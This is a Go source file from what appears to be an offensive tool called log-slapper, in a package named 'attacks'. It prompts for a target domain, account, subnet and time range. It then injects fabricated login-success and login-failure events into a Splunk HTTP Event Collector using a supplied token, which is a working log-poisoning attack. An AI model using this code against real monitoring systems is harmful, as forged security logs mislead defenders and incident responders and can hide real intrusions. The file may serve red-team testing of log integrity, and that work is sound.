package attacks

import (
	"flag"
	"math/rand"
	"strconv"
	"time"

	"github.com/oz9un/log-slapper/pkg/splunk"
	"github.com/pterm/pterm"
)

const timeFormat = "02/01/2006 15:04"

var (
	startTime time.Time
	endTime   time.Time
)

func LoginEventParameterCheck(_startTime string, _endTime string) bool {
	// Check for required flags or use default values
	if _startTime == "" || _endTime == "" {
		pterm.Error.Println("Missing required flags: -starttime and -endtime are required.")
		flag.Usage()
		return false
	}

	var err error

	// Parse start and end time
	startTime, err = time.Parse(timeFormat, _startTime)
	if err != nil {
		pterm.Error.Println("Invalid start time format: %v\n", err)
		return false
	}

	endTime, err = time.Parse(timeFormat, _endTime)
	if err != nil {
		pterm.Error.Println("Invalid end time format: %v\n", err)
		return false
	}

	// Ensure the end time is after the start time
	if !endTime.After(startTime) {
		pterm.Error.Println("End time must be after start time.")
		return false
	}

	return true
}

func LoginSpamGetInput() (string, string, int, string) {
	// Ask for the target domain name
	domainPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("example.com")
	targetDomain, _ := domainPrompt.Show("Enter the target domain name")

	// Ask for the target account name
	accountPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("administrator")
	targetAccount, _ := accountPrompt.Show("Enter the target account name")

	// Ask for the target subnet
	subnetPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("10.10.41.0/24")
	targetSubnet, _ := subnetPrompt.Show("Enter the target subnet")

	timePromptStart := pterm.DefaultInteractiveTextInput.WithDefaultValue("24/03/2024 17:16")
	timePromptEnd := pterm.DefaultInteractiveTextInput.WithDefaultValue("24/03/2024 17:20")

	startTimeStr, _ := timePromptStart.Show("Enter the start time")
	endTimeStr, _ := timePromptEnd.Show("Enter the end time")

	// Ask for the count
	countPrompt := pterm.DefaultInteractiveTextInput.WithDefaultValue("10")
	countStr, _ := countPrompt.Show("Enter the count")
	count, err := strconv.Atoi(countStr) // Convert the input to an integer
	if err != nil {
		pterm.Error.Println("Please enter a valid number for count.")
		return LoginSpamGetInput() // Recursively call the function again to get correct input
	}

	LoginEventParameterCheck(startTimeStr, endTimeStr)

	return targetDomain, targetSubnet, count, targetAccount
}

func LoginEventSpam(count int, domain string, subnet string, HEC_url string, HEC_token string, targetAcc string) {

	var data [][]string

	// Generate and send the specified number of events within the time range
	for i := 0; i < count; i++ {
		// Randomly select a time within the range
		randomTime := startTime.Add(time.Duration(rand.Float64() * float64(endTime.Sub(startTime))))

		event, hostname, ip := splunk.GenerateLoginEvent(domain, subnet, randomTime, targetAcc)
		err := splunk.SendHECEvent(HEC_url, HEC_token, event)
		if err != nil {
			pterm.Error.Println("Error sending login event %d: %s\n", i+1, err)
			return
		}
		formattedTime := randomTime.Format("2006-01-02 15:04:05 MST")
		data = append(data, []string{hostname, ip, formattedTime})
		//fmt.Printf("Login event %d sent successfully.\n", i+1)
	}

	pterm.DefaultSection.WithLevel(2).Println("Generated login success events data:")
	pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(pterm.TableData(append([][]string{{"Hostname", "IP", "Time"}}, data...))).Render()
}

func LoginFailEventSpam(count int, domain string, subnet string, HEC_url string, HEC_token string, targetAcc string) {

	var data [][]string

	// Generate and send the specified number of events within the time range
	for i := 0; i < count; i++ {
		// Randomly select a time within the range
		randomTime := startTime.Add(time.Duration(rand.Float64() * float64(endTime.Sub(startTime))))

		event, hostname, ip := splunk.GenerateLoginFailedEvent(domain, subnet, randomTime, targetAcc)
		err := splunk.SendHECEvent(HEC_url, HEC_token, event)
		if err != nil {
			pterm.Error.Println("Error sending login failed event %d: %s\n", i+1, err)
			return
		}

		formattedTime := randomTime.Format("2006-01-02 15:04:05 MST")
		data = append(data, []string{hostname, ip, formattedTime})
	}
	pterm.DefaultSection.WithLevel(2).Println("Generated login fail events data:")

	pterm.DefaultTable.WithHasHeader().WithBoxed().WithData(pterm.TableData(append([][]string{{"Hostname", "IP", "Time"}}, data...))).Render()

}
